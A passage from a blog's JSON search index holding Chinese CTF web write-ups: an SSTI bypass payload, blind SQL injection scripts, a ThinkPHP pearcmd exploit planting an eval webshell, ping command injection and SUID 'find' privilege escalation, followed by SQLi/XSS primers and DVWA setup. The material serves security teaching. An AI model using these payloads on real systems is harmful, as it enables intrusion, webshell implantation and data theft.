/flag：\n((()|select|string|list)|attr(po)(15),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(16),(()|select|string|list)|attr(po)(10),(config|string|list)|attr(po)(279),(()|select|string|list)|attr(po)(41),(()|select|string|list)|attr(po)(20),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(1))|join()\n\n成功获取FLAG，最后给出最终完整的Payload：\n&#123;%set%0apo=dict(po=a,p=a)|join()%&#125;&#123;%set%0aa=(()|select|string|list)|attr(po)(24)%&#125;&#123;%set%0aglo=(a,a,dict(glo=aa,bals=aa)|join,a,a)|join()%&#125;&#123;%set%0ageti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()%&#125;&#123;%set%0ape=dict(po=aaa,pen=aaa)|join()%&#125;&#123;%set%0are=dict(rea=aaaaa,d=aaaaa)|join()%&#125;&#123;&#123;lipsum|attr(glo)|attr(geti)(dict(o=a,s=a)|join())|attr(pe)(((()|select|string|list)|attr(po)(15),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(16),(()|select|string|list)|attr(po)(10),(config|string|list)|attr(po)(279),(()|select|string|list)|attr(po)(41),(()|select|string|list)|attr(po)(20),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(1))|join())|attr(re)()&#125;&#125;","categories":["Write Up"],"tags":["CTF","web"]},{"title":"2022Dest0g3-520迎新赛-web(部分)","url":"/2022/12/27/2022Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-web-%E9%83%A8%E5%88%86/","content":"最近身体抱恙，终于缓过劲来继续着手学习、做题。一方面对SQL注入基础和数据库基础做了一定的知识补充，另一方面接着投入到暑假时未竟的Dest0g3-520迎新赛上。感兴趣的朋友们可以到我的博客转转 Latte’s Blog ，也欢迎大家为我提取一些宝贵的意见。\n题目地址\nReally Easy SQL网站title告诉我们这是一个“精美的钓鱼站”，大抵是用来诱惑用户输入账号密码，然后将他们存储到数据库中去。输入一些账号密码进去尝试一下，发现不会回显有用信息，差不多可以判断是一道insert型的盲注题了。题目给出了Hint：\nReally Easy SQL insert型注入$black_list=array(&#x27;union&#x27;,&#x27;updatexml&#x27;,&#x27;order&#x27;,&#x27;by&#x27;,&#x27;substr&#x27;,&#x27;and&#x27;,&#x27;extractvalue&#x27;,&#x27;;&#x27;,&#x27;sleep&#x27;,&#x27;join&#x27;,&#x27;alter&#x27;,&#x27;handler&#x27;,&#x27;char&#x27;,&#x27;+&#x27;,&#x27;/&#x27;,&#x27;like&#x27;,&#x27;regexp&#x27;,&#x27;offset&#x27;,&#x27;sleep&#x27;,&#x27;case&#x27;,&#x27;&amp;&#x27;,&#x27;-&#x27;,&#x27;hex&#x27;,&#x27;%0&#x27;,&#x27;load&#x27;,&#x27; &#x27;);\n被ban掉了许多东西，包括时间盲注常用的函数sleep，没关系，我们还有benchmark可以用。\n\n这里给出一些时间盲注常用的函数：\n\nsleep()                      //延迟函数BENCHMARK(count,expr)函数    //将expr语句执行count次来达到延迟的目的，返回值为0if(condition,true,false)     //条件语句If表达式：IF(expr1,expr2,expr3)/* 如果 expr1 是TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3 */ascii()                     //转换成ascii码substring(&quot;string&quot;,strart,length) //mid()也一样，取出字符串里的第几位开始，长度多少的字符Mid函数：MID(column_name,start[,length])\n\n用benchmark方法测试一下（空格被ban了，所以用%a0过滤。前后的&#39;是为了闭合，除此外，还可以采用(等方式）：\na&#x27;or%a0benchmark(1000000,sha(1))or&#x27;\n\n\n测试延时在4s左右。\n\n关于insert注入的原理，我这里留一个疑问。对于这道题目而言，username显然是一个字符串型，而benchmark函数返回值为0，如果insert语句如下\n\ninsert into ctf_test values(&#x27;a&#x27;or%a0benchmark(1000000,sha(1))or&#x27;&#x27;,&#x27;123456&#x27;);\n\n那么SQL为什么不会因为错误Truncated incorrect DOUBLE value: &#39;a&#39;而无效？下图是我在本地MySQL进行测试的结果。可以看到，当没有a时会成功执行benchmark函数，并把返回的0作为字符型存入数据库表。而有a时，则会报错。（在后面的尝试中，发现把a改成其他数字也是可以成功执行的）\n\n\n\n接下来回顾一些常用的SQL SELECT操作\n// 爆表名select(group_concat(table_name))from(information_schema.tables)where(table_schema=database());// 爆字段名（列名）select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;test&#x27;);  // 这里的&#x27;test&#x27;即上一步爆出的表名\n\n前面我们测试的延时在4s左右，延迟过长，这里选择更用md5(1)，将延时控制在2s左右。mid函数能够获取爆出的数据的每一个字符，于是我们可以二分查找所有的字符进行遍历(这里用ASCII码为从32到127的字符集来实现)，与之ASCII码值进行比对——当i &lt; mid时，说明mid找大了，更新为最大值为mid；反之，则更新最小值为mid。mid更新的实现只需要每次进行request连接，并设置超时时间。当超时时，说明i &lt; mid，触发了benchmark.\n根据上面的分析，我们就可以利用SQL语句能够在insert语句中被执行的特点，构造POC. \nimport requestsimport timeurl = &quot;http://20351089-cacb-4fea-a68f-feb330422825.node4.buuoj.cn:81/&quot;flag = &#x27;&#x27;for i in range(1, 50):    m = 32    n = 127    while 1:        mid = (m + n) // 2        # payload=&quot;0&#x27;or(if((ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&lt;&#123;&#125;),benchmark(2000000,md5(1)),0))or&#x27;&quot;.format(i,mid) #flaggg,user        # payload=&quot;0&#x27;or(if((ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flaggg&#x27;)),&#123;&#125;,1))&lt;&#123;&#125;),benchmark(2000000,md5(1)),0))or&#x27;&quot;.format(i,mid) #cmd        payload = &quot;0&#x27;or(if((ascii(mid((select(cmd)from(flaggg)),&#123;&#125;,1))&lt;&#123;&#125;),benchmark(2000000,md5(1)),0))or&#x27;&quot;.format(i, mid)        data = &#123;            &#x27;username&#x27;: payload,            &#x27;password&#x27;: &#x27;123456&#x27;        &#125;        # print(data)        try:            r = requests.post(url=url, data=data, timeout=1.5)            m = mid        except:            n = mid        if (m + 1 == n):            flag += chr(m)            print(flag)            break        time.sleep(0.2)    time.sleep(1)\n\n如上就是一道盲注题的完整思路，或可作为学习SQL注入的基础知识的一部分来看。关于最大超时时间的设置和benchmark的执行次数需要根据实际测试情况进行调整，与网速有着关系，这可能导致跑出来的结果有误差，有没有减小误差的办法呢？\neasysql与上题几乎没有什么不同，区别在于多过滤了&lt;和&gt;（虽然我也不知道怎么看出来多过滤了这俩玩意儿，Hint貌似没给），因此无法再用二分法，改用=即可。构造POC如下：\nimport requestsimport timeurl = &quot;http://983f9517-713d-4041-8c6d-d3dc94e57452.node4.buuoj.cn:81/&quot;flag = &#x27;&#x27;for i in range(1, 50):    a = 0    for j in range(128, 32, -1):        # payload=&quot;0&#x27;or(if((ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))=&#123;&#125;),benchmark(2000000,md5(1)),0))or&#x27;&quot;.format(i,j) #flaggg,user        # payload=&quot;0&#x27;or(if((ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flaggg&#x27;)),&#123;&#125;,1))=&#123;&#125;),benchmark(2000000,md5(1)),0))or&#x27;&quot;.format(i,j) #cmd        payload = &quot;0&#x27;or(if((ascii(mid((select(cmd)from(flaggg)),&#123;&#125;,1))=&#123;&#125;),benchmark(2000000,md5(1)),0))or&#x27;&quot;.format(i, j)        data = &#123;            &#x27;username&#x27;: &#x27;a&#x27;,            &#x27;password&#x27;: payload        &#125;        # print(data)        try:            r = requests.post(url=url, data=data, timeout=1.5)        except:            flag += chr(j)            print(flag)            break        if (j == 33):            a = 1        time.sleep(0.5)    if (a == 1):        print(flag)        break    time.sleep(1)\n\n\n\nNodeSoEasyPharPOP考点在于phar反序列化，题目给出源码\n&lt;?phphighlight_file(__FILE__);function waf($data)&#123;    if (is_array($data))&#123;        die(&quot;Cannot transfer arrays&quot;);    &#125;    if (preg_match(&#x27;/get|air|tree|apple|banana|php|filter|base64|rot13|read|data/i&#x27;, $data)) &#123;        die(&quot;You can&#x27;t do&quot;);    &#125;&#125;class air&#123;    public $p;    public function __set($p, $value) &#123;        $p = $this-&gt;p-&gt;act;        echo new $p($value);                    // 4.任意类，最终利用点    &#125;&#125;class tree&#123;    public $name;    public $act;    public function __destruct() &#123;        return $this-&gt;name();                   // 1.触发 tree 的 _call 方法    &#125;    public function __call($name, $arg)&#123;        $arg[1] =$this-&gt;name-&gt;$name;            // 2.触发 apple 的 _get 方法    &#125;&#125;class apple &#123;    public $xxx;    public $flag;    public function __get($flag)    &#123;        $this-&gt;xxx-&gt;$flag = $this-&gt;flag;        // 3.触发 air 的 _set 方法    &#125;&#125;class D &#123;    public $start;    public function __destruct()&#123;        $data = $_POST[0];        if ($this-&gt;start == &#x27;w&#x27;) &#123;            waf($data);            $filename = &quot;/tmp/&quot;.md5(rand()).&quot;.jpg&quot;;            file_put_contents($filename, $data);            echo $filename;        &#125; else if ($this-&gt;start == &#x27;r&#x27;) &#123;            waf($data);            $f = file_get_contents($data);            if($f)&#123;                echo &quot;It is file&quot;;            &#125;            else&#123;                echo &quot;You can look at the others&quot;;            &#125;        &#125;    &#125;&#125;class banana &#123;    public function __get($name)&#123;        return $this-&gt;$name;    &#125;&#125;// flag in /if(strlen($_POST[1]) &lt; 55) &#123;    $a = unserialize($_POST[1]);&#125;else&#123;    echo &quot;str too long&quot;;&#125;throw new Error(&quot;start&quot;);?&gt;\n\n解题思路列出几个分析POP链常用的魔术方法\n__construct()  //当对象创建时触发__destruct()   //当对象销毁时触发__wakeup()     //当使用unserialize时触发__sleep()     //当使用serialize时触发__call()      //当对象上下文中调用不可访问的方法时触发__get()       //当访问不可访问或不存在的属性时触发__set()       //当设置不可访问或不存在属性时触发__toString()  //当把类当作字符串使用时触发__invoke()    //当对象调用为函数时触发\n\n审计源码找出一条可利用的链子\ntree::_destruct() =&gt; tree::_call() =&gt; apple::_get() =&gt; air::_set() =&gt;  原生类\n\n\n","categories":["Write Up"],"tags":["CTF","web"]},{"title":"2023TimeKeeper-X-HashTeam","url":"/2023/04/09/2023TimeKeeper-X-HashTeam/","content":"题目地址\nWeb签到-连连看在前端中找到疑似flag的字符串：\n\n\n&quot;\\x54\\x4b\\x48\\x41\\x53\\x48\\x7b\\x57\\x65\\x31\\x63\\x34\\x6d\\x33\\x5f\\x54\\x30\\x5f\\x54\\x4b\\x2a\\x48\\x41\\x53\\x48\\x5f\\x43\\x54\\x46\\x5f\\x33\\x6e\\x6a\\x30\\x79\\x5f\\x31\\x74\\x7d&quot;\n\n输出即拿到FLAG：\nTKHASH&#123;We1c4m3_T0_TK*HASH_CTF_3nj0y_1t&#125;\n\nthink题目给出提示“thinkphp是很好的php开发框架，小猪猪尤其喜欢它的多语言功能”。放搜索引擎容易查到ThinkPHP 多语言模块RCE漏洞。攻击者可以通过 get、header、cookie 等位置传入参数，实现目录穿越+文件包含，通过 pearcmd 文件包含这个 trick 即可实现 RCE。\n给出exp如下：\n?lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_POST[&#x27;new&#x27;]);?&gt;+/var/www/html/new.php\n\n值得注意的是，如果直接传入lang会导致&lt;,&#39;,&gt;被编码，从而无法被解析，如下图：\n\n\n\n因此需要借助BurpSuite抓包，对请求包做一下修改。之后成功上传，且路径给出，即可用蚁剑连接，拿到flag.\n\n\nTKHASH&#123;ggb0nd_l1k3s_e4t1ng_loll1p0p&#125;\n\n\n资料：ThinkPHP 多语言模块RCE漏洞复现\n\nnew friends一道文件上传题目，只能上传.png后缀的文件，且前后端都有过滤，无法直接对后缀修改或上传.htaccess配置文件修改文件解析方式。\n这里先把先将一句话木马改成.png后缀，成功上传webshell.png。并且告诉我们上传文件夹在/uploads。\n接下来试着对ping功能下手。我们知道ping主机在服务器上的实现如下:\nping 0.0.0.0\n\n如果是（借助;分隔两条命令）\nping 0.0.0.0;ls\n\n就可以实现ping和ls两条命令的先后执行。这里进行尝试，结果如下：\n\n\n可以看到，ls命令成功执行，并且找到了我们uploads文件夹，下一步只需借助mv命令对webshell.png重命名即可，payload如下：\n0;cd uploads;mv webshell.png webshell.php\n\n\nwebshell.png重命名成功，下一步用蚁剑连接，寻找到flag，但是因为权限不够，无法打开该文件，需要提权。\nLinux下SUID提权方法：SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。已知的可用来提权的linux可行性的文件列表如下：\nnmapvimfindbashmorelessnanocp\n\n此时，我们首先用如下命令查看具有root用户权限的SUID文件\nfind / -perm -u=s -type f 2&gt;/dev/null\n\n发现find文件恰好是以suid权限运行，继续查看find的信息，确实是root权限的suid文件(含s)\n\n\n于是通过find执行的所有命令都会以root权限执行。\n接下来我们用find进行权限提升，执行如下命令，将会显示root\n/usr/bin/find 系统中任意存在的文件名 -exec 命令 \\;      //注: \\;是-exec选项的参数\n\n然后读取flag即可：\n/usr/bin/find flag -exec cat flag \\;\n\n拿到flag：\nTKHASH&#123;h1ll0_m1_new_fr1ends&#125;\n\n\n资料：Linux提权:利用SUID提权\n\n","categories":["Write Up"],"tags":["CTF","web"]},{"title":"SQL注入","url":"/2022/12/15/SQL%E6%B3%A8%E5%85%A5/","content":"SQL注入原理SQL注入产生的原因当Web应用向后台数据库传递SQL语句进行数据库操作时，如果用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。\nSQL注入的本质把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则。\nSQL注入的关键点\n用户能够控制输入的内容；\nWeb应用把用户输入的内容带到数据库中执行\n\nSQL注入的危害\n盗取网站的敏感信息\n绕过后台认证后台登录语句select * from admin where username = &#x27;admin&#x27; and password = &#x27;password&#x27;万能密码&#x27; or &#x27;1&#x27; = &#x27;1&#x27; #\n借助SQL注入漏洞提权获取系统权限\n读取文件信息\n\nSQL注入的分类\n根据诸如位置分类：GET型、POST型、Head头注入\n\n根据反馈结果分类：有回显、无回显\n Ⅰ. 有回显\n\n可以联合查询的注入\n报错注入\n通过注入进行DNS请求，从而达到可回显的目的\n\n Ⅱ. 无回显\n\nBool盲注\n时间盲注\n\n\n根据数据类型分类：数字型（输入的参数为整型，如id、年龄、页码等），字符型（输入的参数为字符串）\n\n\n数字型与字符型最大的区别在于：数字型不需要单引号闭合，而字符型一般需要单引号闭合。\n另外还需注意二次注入，一般需要自己编写代码以实现自动化注入。\nSQL注入的流程注入点的位置及发现SQL注入需要寻找与数据库有关联的请求。常见的注入点不一定是表单中的username字段，有时候注入点还会隐藏在不同的地方，下面我们来介绍几个常见的注入点的位置。\n\nGET参数中的注入：GET中的注入点一般最容易发现，因为我们可以在地址栏获取URL和参数等，可以用Sqlmap或者手工验证是否存在注入。\nPOST中的注入：POST中的注入点一般需要我们通过抓包操作来发现，如使用Burp或Hackbar来发送POST包。同样也可以使用Sqlmap或者手工验证。\nUser-Agent中的注入：在希望发现User-Agent中的注入时，可以使用Burp中的Repeater模块，或者Sqlmap。将Sqlmap的参数设置为：level=3，这样Sqlmap会自动检测User-Agent中是否存在注入。\nCookie中的注入：想要发现Cookie中的注入， 可以使用Burp中的Repeater模块，或者Sqlmap。将Sqlmap的参数设置为：level=2，这样Sqlmap会自动检测Cookie中中是否存在注入。\n\n判读注入点是否存在在判断输入点是否存在注入时，可以先假设原程序执行的SQL语句，如\nSELECT UserName FROM User WHERE id = &#x27;$id&#x27;;    // 参数为字符串或SELECT UserName FROM User WHERE id = $id;   // 参数为数字\n\n然后通过以下几种方法进行判断：\n\n插入单引号：插入单引号是我们最常用的检测办法，原理在于未闭合的单引号会引起SQL语句单引号未闭合的错误\n数字型判断：通过 or 1=1 （数字型）和闭合单引号的测试语句 &#39;or &#39;1&#39;=&#39;1 进行判断，这里采用Payload &#39;1&#39;=&#39;1 的目的是闭合原语句后方的单引号，也可以选择&#39;1&#39;=&#39;1&#39;#注释掉后面的单引号\n通过数字的加减判断：比如，我们在遇到的题目中抓到了链接 http://example.com/?id=2 就可以进行如下的尝试 http://example.com/?id=3-1 . 如果二者结果相同，则证明id这个输入点可能存在SQL注入漏洞\n\n*判断闭合方式?id=1cccc\n\n有报错：数字型，无闭合或用 ) 闭合\n无报错：字符型，再用： &#39; , &quot; , &#39;) , &quot;) 根据报错信息判断\n判断字段数（列数）及回显位?id=1&#x27; order by 3#?id=1&#x27; order by 2#\n利用SQL的特性，当查询时order by后的数字大于列数时就会报错，根据这一点可判断列数（借助二分法可快速判断）\n\n\norder by 3时报错，order by 2时不报错，表名为两个字段。\n\n\nUNION 联合查询UNION关键字，联合查询，可以实现将两个select语句合并为一条语句，并显示为一个结果。\n\n\n需要注意，联合查询下，两个select语句所查询的表一定为相同字段数量！\nMySQL基础查询语法告诉我们查询系统当前使用的数据库名称的方法：\nselect database();  // 查询查询当前数据库名称\n\n而如果培训和union联合查询，必须构造相同字段数：\nselect 1, database();   // 两个字段select 1, 2, database();    // 三个字段\n\n\n\n利用这一点，可以联合查询出数据库名：\n\n\n并且可以知道，第一个字段的值将会显示在First name处，第二个字段的值将会显示在Surname处。\n接下来我们需要查询数据库的表有什么内容，这将会利用这个自带的数据库来查询表名—— information_schema , 在该数据库中存在 tables 表， 提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。\nselect id from test.students;    //跨数据库查询test库中的students表的id字段(只显示id这一列)select table_name from information_schema.tables; //查询所有的表名select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27;;    //查询数据库dvwa的中的所有表名\n\n由此构造联合查询sql语句，payload如下：\n0&#x27; union select 1, table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27;#  //后面的&#x27;#可去掉\n\n\n\n由此获得目的数据库中的所有表的表名。由于字段数未知，还需要借助 information_schema 的 COLUMNS 表，该表提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。\nselect column_name from information_schema.columns where table_name=&#x27;users&#x27;;    //查询users表的所有列名# 注入payload0&#x27; union select 1, column_name from information_schema.columns where table_name=&#x27;users# group_concat(column_name) 使在一条记录中显示0&#x27; union select 1, group_concat(column_name) from information_schema.columns where table_name=&#x27;users\n\n\n\n由此得到了数据库名、表名、列名，就可以配合select查询语句，获取每一条记录的内容\n0&#x27; union select user, password from users#\n\n\n\n","categories":["渗透：从0到1"],"tags":["web","渗透"]},{"title":"XSS跨站脚本攻击","url":"/2022/12/24/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/","content":"XSS 基础XSS 简介和原理XSS（Cross Site Scripting 跨站脚本攻击），指恶意攻击者通过向网站插入恶意payload或恶意脚本，从而盗取cookie、session信息以利用用户身份进行违规操作、盗取用户资料等等。\n其原理是攻击者在网页中嵌入客户端脚本（通常是JavaScript的恶意脚本），当用户使用浏览器加载被嵌入恶意代码的网页时，恶意脚本代码就会在用户的浏览器执行，造成跨站脚本攻击。\nXSS 危害跨站脚本攻击可能会产生盗取（挟持）Cookie、网络钓鱼、植马挖矿、刷流量、劫持后台、篡改页面、内网扫描、制造蠕虫等。\n\n\n常出现的场景\n重灾区：评论区、留言区、个人信息、订单信息等\n针对性区域：站内信、网页即时通讯、私信、意见反馈等\n存在风险：搜索框、当前目录、图片属性等\n\nXSS 类型反射型 XSS网站对于用户提交的数据没有进行过滤或转义操作（或者过滤、转义不足），导致攻击者嵌入的恶意代码被提交给服务端，服务端解析后，在相应内容中返回输入的XSS代码，最终由浏览器解释执行。\n\n反射型XSS 是非持久性、参数性的跨站脚本，恶意代码并没有保存在目标网站，而是通过引诱用户点击一个链接到目标网站的恶意链接来实施攻击。\n出现场景：多出现在搜索框或输入框\n\n原型如下：\n&lt;?phpecho &#x27;your input:&#x27; . $_GET[&#x27;input&#x27;];?&gt;\n\n若input为&lt;script&gt;alert(/XSS/)&lt;/script&gt;且input值未经任何过滤便直接输出，则服务端解析后，echo语句会将客户端输入的代码完整地输出到HTTP响应中，浏览器解析并执行，从而实现弹窗。当然，攻击者可以直接以此构造url，当用户受惑点击该url链接，攻击就发生了。\n反射型XSS 利用流程\n\n存储型 XSS反射型XSS每次皆需要用户提交代码（也即“点击”）才能进行攻击。而存储型XSS提交的XSS代码会存储在服务器端，下次请求该网页时无需再次提交XSS代码。常见的应用场景有留言板、在线聊天室、邮件服务或黑客的嵌入恶意JavaScript代码的博客文章等。\n当攻击者提交包含XSS代码的留言后，服务端会将其存储在数据库中，当其他用户访问网页查看留言时，服务端将从数据库中查询已有留言，并将其内容输出在HTTP响应中，由浏览器对包含恶意代码的响应解析并执行。\n原型如下：\n&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123;    // Get input    $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );    $name    = trim( $_POST[ &#x27;txtName&#x27; ] );    // Sanitize message input    $message = stripslashes( $message );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Sanitize name input    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );    //mysql_close();&#125;?&gt; \n\n攻击者提交留言&lt;script&gt;alert(/XSS/)&lt;/script&gt;后，XSS代码被保存在 数据库中，并且立即执行了一次查询，XSS代码直接被触发。当其他用户访问网页时，服务端都将从数据库中查询到该XSS代码，触发执行，从而被盗取cookie（sessionid）等信息。\n存储型XSS 利用流程\n\nDOM XSSDOM 简介\nDOM，全称Document Object Model(文档对象模型)，是W3C推荐的一种独立于平台和语言的标准，定义了访问HTML和XML文档的标准。\nDom即Window对象下内置的document对象\n\ndocument对象提供了非常多的操作方式，我们可以通过document对象实现对网页内容的一些操作如文本的修改、属性的修改、元素的获取等。\n与反射型 XSS不同，DOM XSS不需经由服务器的响应、处理\n\n\n\nDOM-XSS基于前端做的一些限制和筛选，对当前页面做一些直接化的修改。简单去理解就是输出点在DOM，属于特殊的反射型XSS。\n\n常见的DOM方法\n\n\nDOM-XSS 利用流程其利用与反射型XSS十分相似，不再赘述。但需要注意：由于前端的限制，我们需要在URL中输入XSS探测脚本。\n三种类型的比较\n\n\nXSS类型\n存储型\n反射型\nDOM型\n\n\n\n触发过程\n1、黑客构造XSS脚本2、正常用户访问携带XSS脚本的页面\n正常用户访问携带XSS脚本的URL\n正常用户访问携带XSS脚本的URL\n\n\n数据存储\n服务器\nURL\nURL\n\n\n谁来输出\n后端Web应用程序\n后端Web应用程序\n前端JavaScript\n\n\n输出位置\nHTTP响应中\nHTTP响应中\n动态构造的DOM节点中\n\n\n是否持久\n是\n否\n否\n\n\n防御手段\n对用户的输入进行合理验证\n\n对 (, &lt; , &gt; , &#39; , &quot; 等特殊字符以及 &lt;script&gt;, javascript 等字符串进行过滤\n\n根据数据位置设置恰当的输出编码\n\n根据数据将要至于HTML上下文中的不同位置(HTML标准、HTML属性、Javascript脚本、CSS、URL)，对所有不可信数据进行恰当的输出编码\n\n设置HttpOnly属性\n\n避免攻击者利用XSS属性进行Cookie劫持攻击。\n","categories":["渗透：从0到1"],"tags":["web","渗透","常见漏洞"]},{"title":"web基础和靶场搭建","url":"/2022/12/12/web%E5%9F%BA%E7%A1%80%E5%92%8C%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/","content":"Web是互联网的总称，全称即World Wide Web， 缩写为WWW，全球广域网，也称为万维网，它是一种基于超文本和HTTP的、全球性的、动态交互的、跨平台的分布式图形信息系统。简单来说，Web是一种体系结构，通过它可以访问遍布于因特网主机上的连接文档。web安全简单来说就是网站的安全，那么我们需要学习的是，网站上可能出现哪些漏洞（常见漏洞类型和原理），如何寻找这些漏洞，如何利用这些漏洞。本文可以作为“渗透：从0到1”的先导篇目。\n\n漏洞挖掘漏洞定义对于漏洞的官方定义：漏洞是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而使攻击者能在未授权的情况下访问或破坏系统。通俗的讲，只要可以给厂商带来损失的都可以被叫做漏洞。\n\n\n漏洞类型(OWASP Top 10 2021 and part of Top 10 2017)\n\n\n\n\n\n\n\nA01\n2021-失效的访问控制(Broken Access Control)\n\n\nA02\n2021-加密机制失败(Cryptographic Failures)\n\n\nA03\n2021-注入(Injection)\n\n\nA04\n2021-不安全设计(Insecure Design)\n\n\nA05\n2021-安全配置错误(Security Misconfiguration)\n\n\nA06\n2021-自带缺陷和过时的组件(Vulnerable and Outdated Components)\n\n\nA07\n2021-身份识别和身份验证错误(Identification and Authentication Failures)\n\n\nA08\n2021-软件和数据完整性故障(Software and Data Integrity Failures)\n\n\nA09\n2021-安全日志和监控故障(Security Logging and Monitoring Failures)\n\n\nA10\n2021-服务端请求伪造(Sever-Side Request Forgery)\n\n\nA03\n2017-敏感信息泄露(Sensitive Data Exposure)\n\n\nA07\n2017-跨站脚本攻击(XSS)\n\n\nA08\n2017-不安全的反序列化\n\n\nA09\n2017-使用含有已知漏洞的组件\n\n\nA10\n2017-不足的日志记录和监控\n\n\n不难发现，许多CTF比赛的web题就是从这些漏洞中出题，因此必须对常见的漏洞进行具体细致的了解，这也是“挖洞”的基础。\n漏洞靶场之DVWADVWA是OWASP官方编写的PHP网站，包含了各种网站常见漏洞，可以学习攻击及修复方式。关于靶场的搭建，可以用源码配合phpStudy小皮面板实现（市面上有许多种类的靶场，另一个我正在学习使用的就是pikachu），具体步骤可参考如下过程：\nDVWA的安装\n1 下载安装 phpStudy 和 DVWA源码\n\n可以根据需要，下载合适版本的phpStudy.\nphpStudy下载地址:phpStudy\n接下来获取DVWA靶场源代码.\nDVWA源代码下载地址1:DVWA源码\nDVWA源代码下载地址2:DVWA源码\n\n2 将解压后的DVWA源代码放置phpStudy的安装目录WWW文件夹中(有时需要修改源代码文件夹名dvwa-master为DVWA)\n\n\n3 进入DVWA&#x2F;config目录，将config.inc.php.dist中的dist删去\n\n\n4 打开刚刚重命名的config.inc.php文件，修改db_user和db_password  &#x2F;&#x2F;默认改为root root\n\n\n\nDVWA在创建的时候需要在本地安装创建一个数据库(database)，也就意味着需要连接到本地已有的MySQL的数据库的软件，然后再用这个软件去创建一个DVWA的数据库。因此，其需要MySQL账号密码授权。这里我没有使用phpStudy的MySQL，而是使用本地自己安装的MySQL，用户名为root，密码为123@hui.如下图生成一个数据库\n\n\n而对于phpStudy中集成的MySQL服务的账号密码默认为root和root，故若使用phpStudy中的MySQL，需要将修改db_user和db_password为root和root.\n\n5 浏览器访问http://localhost/DVWA/setup.php, 点击最下方的Create Database.\n\n\n6 浏览器访问http://localhost/DVWA/, 输入用户名admin，密码password，登录DVWA即可。\n\nDVWA的使用在DVWA Security中可以手动调整靶机源码的安全级别，分别为 Low，Medium，High，Impossible，级别越高，安全防护越严格，渗透难度越大。一般 Low 级别基本没有做防护或者只是最简单的防护，很容易就能够渗透成功；而 Medium 会使用到一些非常粗糙的防护，需要使用者懂得如何去绕过防护措施；High 级别的防护则会大大提高防护级别，一般 High 级别的防护需要经验非常丰富才能成功渗透；最后 Impossible 基本是不可能渗透成功的，所以 Impossible 的源码一般可以被参考作为生产环境 Web 防护的最佳手段。\nDVWA 一共包含了十个攻击模块，分别是：Brute Force（暴力（破解））、Command Injection（命令行注入）、CSRF（跨站请求伪造）、- File Inclusion（文件包含）、File Upload（文件上传）、Insecure CAPTCHA （不安全的验证码）、SQL Injection（SQL注入）、SQL Injection（Blind）（SQL盲注）、XSS（Reflected）（反射型跨站脚本）、XSS（Stored）（存储型跨站脚本）。包含了 OWASP TOP10 的所有攻击漏洞的练习环境，一站式解决所有 Web 渗透的学习环境。\nDocker基础Docker，即“容器”，便于环境的移植、安装和管理，并且具有很高的安全性。容易想象，如果用以上的办法部署DVWA靶场，当靶场被攻击时，本地将会是非常危险的。\n认识DockerDocker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的Linux或Windows操作系统的机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口\nDocker安装和配置这里在kali-linux-2022.1操作系统中进行Docker的安装和配置。\n查看系统信息和内核版本uname -a  # 显示系统信息uname -v  # 显示内核版本\n\n\n\n更换apt源默认的源在国外，我们通过这个源去下载时耗时将会很久，换源可以提高效率。\nsudo vim /etc/apt/sources.list  # apt源路径: /etc/apt/sources.list\n\n按i进入编辑模式，从以下国内源中选择一个复制进去然后按esc键输入:wq保存退出。\n#中科大deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src 